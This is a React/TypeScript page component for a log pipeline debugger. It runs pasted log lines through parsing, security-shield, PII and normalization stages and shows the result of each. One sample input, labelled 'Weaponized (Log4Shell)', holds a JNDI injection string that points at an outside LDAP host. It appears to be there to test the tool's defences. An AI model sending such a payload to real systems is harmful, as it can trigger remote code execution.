import { useState } from "react";
import { useMutation } from "@tanstack/react-query";
import Editor from "@monaco-editor/react";
import { ArrowDown, Play } from "lucide-react";
import { pipelineTest } from "@/services/endpoints";
import { apiError } from "@/services/api";
import { Badge, Card, ErrorState, PageHeader } from "@/components/ui";
import type { PipelineStageResult, PipelineTestResult } from "@/types";

const STAGE_LABELS: Record<string, string> = {
  security_shield: "SHIELD",
  format_detection: "DETECT",
  parsing: "PARSE",
  cleaning: "CLEAN",
  field_extraction: "EXTRACT",
  pii_obfuscation: "PII",
  normalization: "NORMALIZE",
  validation: "VALIDATE",
};

const SAMPLES: { label: string; raw: string }[] = [
  {
    label: "Linux SSH failure",
    raw: "Sep  2 09:02:15 db-02 sshd[4412]: Failed password for admin from 192.168.1.50 port 443 ssh2",
  },
  {
    label: "Apache access",
    raw: '203.0.113.44 - - [02/Sep/2025:10:15:01 +0000] "POST /api/login HTTP/1.1" 401 173 "-" "python-requests/2.31"',
  },
  {
    label: "Firewall (iptables)",
    raw: "Sep  2 09:01:55 fw kernel: [488213.114] IPTABLES DROP IN=eth0 SRC=192.168.1.50 DST=10.20.0.20 PROTO=TCP SPT=44208 DPT=22 SYN",
  },
  {
    label: "JSON app log",
    raw: '{"ts":"2025-09-02T09:02:12Z","level":"warning","event":"login_failed","user":"admin","src_ip":"192.168.1.50","msg":"auth failure"}',
  },
  {
    label: "Weaponized (Log4Shell)",
    raw: "app: user=admin ${jndi:ldap://198.51.100.9:1389/Exploit} result=ok",
  },
  {
    label: "WASM PoC (pipe-delimited)",
    raw: "2025-09-02T09:02:11Z|db-02|admin|192.168.1.50|login_failed",
  },
];

const PII_MODES = ["configured", "OFF", "MASK", "DETERMINISTIC_HASH"];

const stageTone = (s: string) =>
  s === "error" ? "red" : s === "warn" ? "amber" : s === "skipped" ? "slate" : "green";

export default function PipelineDebuggerPage() {
  const [raw, setRaw] = useState(SAMPLES[0].raw);
  const [piiMode, setPiiMode] = useState("configured");
  const [selected, setSelected] = useState<string>("parsing");

  const run = useMutation({
    mutationFn: () =>
      pipelineTest({ raw, pii_mode: piiMode === "configured" ? undefined : piiMode }),
  });

  const result = run.data;
  const selectedStage = result?.stages.find((s) => s.stage === selected);

  return (
    <div>
      <PageHeader
        title="Live Pipeline Debugger"
        subtitle="Paste a raw log line and run it through the exact pipeline used during ingestion. Nothing is persisted."
        actions={
          <div className="flex items-center gap-2">
            <select
              className="input w-auto py-1.5 text-xs"
              value={piiMode}
              onChange={(e) => setPiiMode(e.target.value)}
            >
              {PII_MODES.map((m) => (
                <option key={m}>{m}</option>
              ))}
            </select>
            <button className="btn-primary" disabled={run.isPending || !raw.trim()} onClick={() => run.mutate()}>
              <Play className="h-4 w-4" /> Run
            </button>
          </div>
        }
      />

      <div className="mb-3 flex flex-wrap gap-1.5">
        {SAMPLES.map((s) => (
          <button
            key={s.label}
            className="badge bg-white/10 text-gray-300 hover:bg-white/20"
            onClick={() => {
              setRaw(s.raw);
              run.reset();
            }}
          >
            {s.label}
          </button>
        ))}
      </div>

      <div className="grid gap-4 lg:grid-cols-[1fr_180px_1.2fr]">
        {/* LEFT: raw editor */}
        <Card className="p-0">
          <div className="border-b border-base-border px-3 py-2 text-xs font-semibold uppercase text-gray-500">
            Raw log
          </div>
          <Editor
            height="360px"
            defaultLanguage="plaintext"
            theme="vs-dark"
            value={raw}
            onChange={(v) => setRaw(v ?? "")}
            options={{
              minimap: { enabled: false },
              fontSize: 12,
              wordWrap: "on",
              lineNumbers: "off",
              scrollBeyondLastLine: false,
            }}
          />
          {result && (
            <div className="border-t border-base-border p-3">
              <div className="mb-1 text-xs font-semibold uppercase text-gray-500">
                Matched spans (parser: {result.parser.name})
              </div>
              <HighlightedRaw raw={result.raw} spans={result.match_spans} />
            </div>
          )}
        </Card>

        {/* CENTER: pipeline flow */}
        <div className="flex flex-col items-stretch gap-1">
          <FlowNode label="RAW" tone="slate" active={false} onClick={() => {}} />
          {(result?.stage_order ?? Object.keys(STAGE_LABELS)).map((stage) => {
            const st = result?.stages.find((s) => s.stage === stage);
            return (
              <div key={stage} className="flex flex-col items-center">
                <ArrowDown className="h-3 w-3 text-gray-700" />
                <FlowNode
                  label={STAGE_LABELS[stage] ?? stage}
                  tone={st ? stageTone(st.status) : "slate"}
                  active={selected === stage}
                  onClick={() => setSelected(stage)}
                  badge={st?.warnings.length || st?.errors.length ? "!" : undefined}
                />
              </div>
            );
          })}
          <ArrowDown className="h-3 w-3 self-center text-gray-700" />
          <FlowNode
            label="UNIVERSAL EVENT"
            tone={result?.event ? "green" : "slate"}
            active={selected === "__event"}
            onClick={() => setSelected("__event")}
          />
        </div>

        {/* RIGHT: stage detail */}
        <Card>
          {run.isError && <ErrorState error={apiError(run.error)} />}
          {!result && !run.isError && (
            <p className="text-sm text-gray-500">Run a log to inspect each stage.</p>
          )}
          {result && selected === "__event" && <EventView event={result.event} result={result} />}
          {result && selected !== "__event" && selectedStage && (
            <StageView stage={selectedStage} />
          )}
        </Card>
      </div>
    </div>
  );
}

function FlowNode({
  label,
  tone,
  active,
  onClick,
  badge,
}: {
  label: string;
  tone: string;
  active: boolean;
  onClick: () => void;
  badge?: string;
}) {
  const color =
    tone === "green" ? "border-emerald-500/60 bg-emerald-500/10"
    : tone === "amber" ? "border-amber-500/60 bg-amber-500/10"
    : tone === "red" ? "border-red-500/60 bg-red-500/10"
    : "border-base-border bg-base-panel";
  return (
    <button
      onClick={onClick}
      className={`relative rounded-md border px-2 py-2 text-center text-[11px] font-semibold tracking-wide ${color} ${
        active ? "ring-2 ring-brand" : ""
      }`}
    >
      {label}
      {badge && (
        <span className="absolute -right-1 -top-1 flex h-4 w-4 items-center justify-center rounded-full bg-amber-500 text-[10px] text-black">
          {badge}
        </span>
      )}
    </button>
  );
}

function HighlightedRaw({
  raw,
  spans,
}: {
  raw: string;
  spans: { field: string; start: number; end: number; text: string }[];
}) {
  const colors = ["#2563eb", "#0ea5e9", "#8b5cf6", "#f59e0b", "#10b981", "#ec4899"];
  const sorted = [...spans].filter((s) => s.start >= 0 && s.end <= raw.length).sort((a, b) => a.start - b.start);
  const parts: React.ReactNode[] = [];
  let cursor = 0;
  sorted.forEach((s, i) => {
    if (s.start < cursor) return;
    if (s.start > cursor) parts.push(<span key={`t${i}`}>{raw.slice(cursor, s.start)}</span>);
    parts.push(
      <span
        key={`s${i}`}
        title={s.field}
        style={{ background: `${colors[i % colors.length]}33`, borderBottom: `2px solid ${colors[i % colors.length]}` }}
      >
        {raw.slice(s.start, s.end)}
      </span>,
    );
    cursor = s.end;
  });
  parts.push(<span key="end">{raw.slice(cursor)}</span>);

  return (
    <div>
      <pre className="overflow-x-auto whitespace-pre-wrap break-all rounded bg-base-bg p-2 font-mono text-[11px] leading-relaxed">
        {parts}
      </pre>
      <div className="mt-1 flex flex-wrap gap-1.5 text-[10px]">
        {sorted.map((s, i) => (
          <span key={i} style={{ color: colors[i % colors.length] }}>
            ● {s.field}
          </span>
        ))}
      </div>
    </div>
  );
}

function StageView({ stage }: { stage: PipelineStageResult }) {
  return (
    <div className="space-y-3 text-sm">
      <div className="flex items-center gap-2">
        <span className="font-semibold">{STAGE_LABELS[stage.stage] ?? stage.stage}</span>
        <Badge tone={stageTone(stage.status)}>{stage.status}</Badge>
        <span className="text-xs text-gray-500">{stage.duration_ms.toFixed(2)} ms</span>
      </div>
      <p className="text-xs text-gray-400">{stage.summary}</p>

      <KV title="Fields" obj={stage.fields} />

      {stage.transformations.length > 0 && (
        <div>
          <div className="label">Transformations</div>
          <ul className="text-xs text-gray-300">
            {stage.transformations.map((t, i) => (
              <li key={i}>· {Object.entries(t).map(([k, v]) => `${k}=${v}`).join("  ")}</li>
            ))}
          </ul>
        </div>
      )}

      {stage.warnings.map((w, i) => (
        <p key={i} className="text-xs text-sev-medium">⚠ {w}</p>
      ))}
      {stage.errors.map((w, i) => (
        <p key={i} className="text-xs text-sev-critical">✖ {w}</p>
      ))}

      {stage.meta && Object.keys(stage.meta).length > 0 && (
        <details className="text-xs">
          <summary className="cursor-pointer text-gray-500">stage metadata</summary>
          <pre className="mt-1 overflow-x-auto rounded bg-base-bg p-2">{JSON.stringify(stage.meta, null, 2)}</pre>
        </details>
      )}
    </div>
  );
}

function EventView({
  event,
  result,
}: {
  event: Record<string, unknown> | null;
  result: PipelineTestResult;
}) {
  if (!event) {
    return (
      <div className="text-sm">
        <p className="text-sev-high">No universal event produced.</p>
        <p className="mt-1 text-xs text-gray-400">
          disposition: <b>{result.disposition}</b> · verdict: <b>{result.security_verdict}</b>
        </p>
        {result.errors.map((e, i) => (
          <p key={i} className="text-xs text-sev-critical">✖ {e}</p>
        ))}
      </div>
    );
  }
  const shown = Object.entries(event).filter(
    ([, v]) => v !== null && v !== "" && !(typeof v === "object" && v && Object.keys(v).length === 0),
  );
  return (
    <div className="space-y-3 text-sm">
      <div className="flex flex-wrap gap-1.5">
        <Badge tone="green">UniversalLogEvent</Badge>
        <Badge tone="slate">disposition {result.disposition}</Badge>
        {result.pii_transformations.length > 0 && (
          <Badge tone="blue">{result.pii_transformations.length} PII transforms</Badge>
        )}
      </div>
      <table className="w-full">
        <tbody>
          {shown.map(([k, v]) => (
            <tr key={k} className="border-b border-base-border/50">
              <td className="py-1 pr-3 text-gray-500">{k}</td>
              <td className="py-1 font-mono text-xs">
                {typeof v === "object" ? JSON.stringify(v) : String(v)}
              </td>
            </tr>
          ))}
        </tbody>
      </table>
      {result.pii_transformations.length > 0 && (
        <div>
          <div className="label">PII transformations</div>
          <ul className="text-xs text-gray-400">
            {result.pii_transformations.map((t, i) => (
              <li key={i}>
                {t.field} ({t.kind}) → <span className="text-brand-fg">{t.pseudonym}</span>
              </li>
            ))}
          </ul>
        </div>
      )}
    </div>
  );
}

function KV({ title, obj }: { title: string; obj: Record<string, unknown> }) {
  const entries = Object.entries(obj ?? {}).filter(([, v]) => v !== null && v !== "");
  if (!entries.length) return null;
  return (
    <div>
      <div className="label">{title}</div>
      <table className="w-full">
        <tbody>
          {entries.map(([k, v]) => (
            <tr key={k} className="border-b border-base-border/40">
              <td className="py-0.5 pr-3 text-gray-500">{k}</td>
              <td className="py-0.5 font-mono text-xs">
                {typeof v === "object" ? JSON.stringify(v) : String(v)}
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}
